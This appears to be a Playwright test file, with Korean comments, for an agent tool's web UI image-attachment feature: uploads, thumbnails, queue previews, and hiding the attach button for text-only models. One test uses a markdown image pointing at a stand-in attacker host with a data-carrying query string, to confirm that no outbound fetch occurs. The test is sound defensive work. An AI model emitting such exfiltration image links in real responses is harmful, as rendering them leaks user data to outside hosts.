"""이미지 첨부 (v10.60.0, docs/vision/DESIGN.md P2) — 실브라우저.

📎 로 고른 파일이 올라가 칩이 되고, 보내면 ``/api/input`` 의 ``images`` 로
큐에 실리는지; 사용자·관찰 카드에 썸네일이 그려지고 그 ``<img>`` 가 실제로
``api/workspace/file`` 에서 로드되는지; 못 보는 모델이면 📎 가 숨는지. 유닛은
엔드포인트와 페이로드까지만 고정하므로 DOM·네트워크 왕복은 여기서만 잡힌다.
"""

from __future__ import annotations

import io
import time

import pytest


def _wait(cond, timeout=8.0, step=0.05):
    deadline = time.time() + timeout
    while time.time() < deadline:
        if cond():
            return True
        time.sleep(step)
    return False


def _png_bytes(size=(64, 32)) -> bytes:
    from PIL import Image

    buf = io.BytesIO()
    Image.new("RGB", size, (0, 160, 0)).save(buf, format="PNG")
    return buf.getvalue()


@pytest.fixture
def ws(stack, tmp_path, monkeypatch):
    """서버 워크스페이스 = tmp — 업로드와 서빙이 거기서 일어난다."""
    monkeypatch.chdir(tmp_path)
    stack.server.workspace = tmp_path.resolve()
    stack.renderer.workspace = str(tmp_path)
    return tmp_path


def test_attach_then_send_queues_the_image(stack, page, ws):
    stack.emit_ready()
    page.goto(stack.url)
    page.wait_for_selector("#attach", timeout=8000)
    page.set_input_files(
        "#attach-input",
        {"name": "shot.png", "mimeType": "image/png", "buffer": _png_bytes()},
    )
    # 올라가면 칩이 서버 참조(경로·크기)를 단다.
    page.wait_for_selector("#attach-strip .attach-chip:not(.uploading)", timeout=8000)
    assert "64×32" in page.inner_text("#attach-strip")
    page.fill("#input", "what is this?")
    page.press("#input", "Enter")
    assert _wait(lambda: stack.server._queue.pending_count() == 1)
    item = stack.server.dequeue_nowait()
    assert item["text"] == "what is this?"
    assert len(item["images"]) == 1
    assert (item["images"][0]["width"], item["images"][0]["height"]) == (64, 32)
    assert (ws / ".agent-cli" / "tmp" / "uploads").is_dir()
    # 보낸 뒤 칩은 비워진다.
    assert page.locator("#attach-strip .attach-chip").count() == 0


def test_cards_draw_thumbnails_that_load(stack, page, ws):
    (ws / "shot.png").write_bytes(_png_bytes())
    ref = {
        "path": "shot.png",
        "mime": "image/png",
        "width": 64,
        "height": 32,
        "bytes": 1,
        "sha256": "",
    }
    stack.emit_ready()
    page.goto(stack.url)
    page.wait_for_selector("#attach", timeout=8000)
    stack.renderer.push_user_message(
        "[dj]: look\n[image: shot.png (64×32)]", author="dj", images=[ref]
    )
    stack.renderer.action("read_file", '{"path": "shot.png"}', 1)
    stack.renderer.observation(
        "[image: shot.png (64×32)]\nimage/png, 1 bytes — attached",
        1,
        "read_file",
        images=[ref],
    )
    page.wait_for_selector("#messages .card-user .thumbs img", timeout=8000)
    # 관찰의 썸네일은 **접힌 행 안**에 있다(스텝 카드·행 모두 접힘이 기본) —
    # 붙어 있는지만 보고, 펼친 뒤 로드를 본다(lazy 이미지는 보여야 로드된다).
    page.wait_for_selector(
        "#messages .step-body .thumbs img", state="attached", timeout=8000
    )
    info = page.evaluate(
        """() => {
            const u = document.querySelector('#messages .card-user .thumbs img');
            const o = document.querySelector('#messages .step-body .thumbs img');
            return {
              userSrc: u.getAttribute('src'),
              obsSrc: o.getAttribute('src'),
              bubble: document.querySelector('#messages .card-user .bubble').innerText,
            };
        }"""
    )
    assert info["userSrc"] == "api/workspace/file?path=shot.png"
    assert info["obsSrc"] == "api/workspace/file?path=shot.png"
    assert _wait(
        lambda: page.evaluate(
            "() => { const i = document.querySelector('#messages .card-user .thumbs img');"
            " return i.complete && i.naturalWidth === 64; }"
        )
    ), "사용자 카드 썸네일이 실제로 로드되지 않았다"
    page.click("#messages .card-assistant.step .step-head")
    page.click("#messages .step-body .row.ok")
    page.wait_for_selector("#messages .step-body .thumbs img", timeout=8000)
    assert _wait(
        lambda: page.evaluate(
            "() => { const i = document.querySelector('#messages .step-body .thumbs img');"
            " return i.complete && i.naturalWidth === 64; }"
        )
    ), "관찰 썸네일이 펼친 뒤에도 로드되지 않았다"
    # 자리표시 줄은 썸네일이 대신한다 — 말풍선 본문에서 사라진다.
    assert "[image:" not in info["bubble"]
    assert "look" in info["bubble"]


def test_text_only_model_hides_the_clip(stack, page, ws):
    from agent_cli.providers.capabilities import ModelCapabilities

    stack.server.binding.capabilities = ModelCapabilities(
        32768, 4096, True, supports_grammar=True, supports_vision=False
    )
    stack.emit_ready()
    page.goto(stack.url)
    page.wait_for_selector("#input", timeout=8000)
    assert _wait(
        lambda: page.evaluate("() => document.getElementById('attach').hidden")
    )


def _ref():
    return {
        "path": "shot.png",
        "mime": "image/png",
        "width": 64,
        "height": 32,
        "bytes": 1,
        "sha256": "",
    }


def test_main_queue_shows_a_mini_thumbnail_while_waiting(stack, page, ws):
    """v10.61.3 — 사용자 실측: main 대기열(입력창 위 ⏳ 목록)이 이미지를 안 그렸다."""
    (ws / "shot.png").write_bytes(_png_bytes())
    stack.emit_ready()
    page.goto(stack.url)
    page.wait_for_selector("#input", timeout=8000)
    stack.server.enqueue(None, "look at this", images=[_ref()])
    stack.server.broadcast_queue()
    page.wait_for_selector("#queue-list .queue-item .mini-thumbs img", timeout=8000)
    assert _wait(
        lambda: page.evaluate(
            "() => { const i = document.querySelector('#queue-list .queue-item .mini-thumbs img');"
            " return !!i && i.complete && i.naturalWidth === 64; }"
        )
    ), "대기열의 작은 썸네일이 로드되지 않았다"


def test_agent_waiting_line_shows_a_mini_thumbnail_without_expanding(stack, page, ws):
    """v10.61.3 — 에이전트 채널 ⏳ 줄: 접힌 채로 작은 썸네일, 펼치면 큰 것."""
    (ws / "shot.png").write_bytes(_png_bytes())
    stack.emit_ready()
    page.goto(stack.url)
    page.wait_for_selector("#input", timeout=8000)
    stack.renderer.agent_message(
        key="agt-1",
        direction="in",
        author="user:dj",
        text="what is in it?",
        item="u-3",
        to="agt-1",
        images=[_ref()],
    )
    page.wait_for_selector(
        ".card-queued .mini-thumbs img", state="attached", timeout=8000
    )
    info = page.evaluate(
        """() => {
            const c = document.querySelector('.card-queued');
            return { mini: c.querySelectorAll('.s .mini-thumbs img').length,
                     bigHidden: !!c.querySelector('.thumbs.row-body.hide'),
                     chipHidden: c.hidden };
        }"""
    )
    assert info["mini"] == 1, info
    assert info["bigHidden"] is True, info  # 큰 썸네일은 펼침 본문에 그대로


def test_markdown_image_loads_from_workspace_and_external_never_fetches(
    stack, page, ws
):
    """v10.64.0: ``![](path)`` 는 작업 폴더에서 실제로 로드되고, 외부 URL 그림은
    링크로만 남아 **요청이 한 번도 나가지 않는다**(보는 것만으로 새는 길 차단)."""
    (ws / "shot.png").write_bytes(_png_bytes())
    outbound: list[str] = []
    page.route(
        "https://evil.example/**",
        lambda route: (outbound.append(route.request.url), route.abort()),
    )
    stack.emit_ready()
    page.goto(stack.url)
    page.wait_for_selector("#attach", timeout=8000)
    stack.renderer.push_user_message(
        "[dj]: chart ![chart](shot.png) and ![leak](https://evil.example/p.png?d=s)",
        author="dj",
    )
    page.wait_for_selector("#messages .card-user .bubble img.md-img", timeout=8000)
    assert _wait(
        lambda: page.evaluate(
            "() => { const i = document.querySelector('#messages .card-user img.md-img');"
            " return i.complete && i.naturalWidth === 64; }"
        )
    ), "마크다운 그림이 작업 폴더에서 로드되지 않았다"
    link = page.evaluate(
        "() => { const a = document.querySelector('#messages .card-user a.md-img-link');"
        " return a && [a.getAttribute('href'), a.textContent]; }"
    )
    assert link == ["https://evil.example/p.png?d=s", "🖼 leak"]
    page.wait_for_timeout(300)
    assert outbound == []
